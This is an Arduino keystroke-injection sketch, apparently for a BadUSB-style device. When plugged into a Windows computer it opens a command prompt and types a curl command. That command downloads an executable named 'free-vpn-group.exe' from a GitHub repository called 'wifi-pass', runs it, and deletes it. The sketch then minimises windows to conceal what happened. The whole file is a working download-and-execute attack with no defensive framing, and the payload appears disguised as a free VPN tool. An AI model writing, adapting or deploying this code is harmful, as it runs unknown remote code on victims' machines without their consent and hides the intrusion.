#include <Keyboard.h>

void open_cmd() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("cmd");
  Keyboard.press(KEY_RETURN);
  delay(50);
  Keyboard.releaseAll();
}

void download_file() {
  Keyboard.print(" curl -o temp.exe https://raw.githubusercontent.com/shayan-0078/wifi-pass/refs/heads/main/free-vpn-group.exe && temp.exe && del temp.exe &&exit");
  delay(200);
  Keyboard.press(KEY_RETURN);
  delay(50);
  Keyboard.releaseAll();
}

void minimize_cmd () {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();
}

void setup() {
  Keyboard.begin();
  delay(2000);
  open_cmd();
  delay(1000);
  download_file();
  minimize_cmd();

}

void loop() {

}